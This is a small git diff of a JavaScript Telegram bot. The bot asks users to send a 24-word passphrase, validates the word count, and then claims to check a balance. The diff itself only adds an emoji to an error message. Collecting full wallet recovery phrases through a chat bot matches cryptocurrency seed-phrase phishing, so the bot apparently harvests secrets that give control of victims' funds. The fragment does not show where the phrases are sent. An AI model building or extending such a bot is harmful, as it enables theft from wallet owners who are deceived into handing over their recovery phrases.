@@ -39,7 +39,7 @@ bot.on('message', async (msg) => {
 
         const words = passphrase.split(/\s+/);
         if(words.length !== 24) {
-            return bot.sendMessage(chatId, 'Invalid passphrase. Please send exactly 24 words');
+            return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
         }
 
         bot.sendMessage(chatId, '⏳ Checking Balance...');
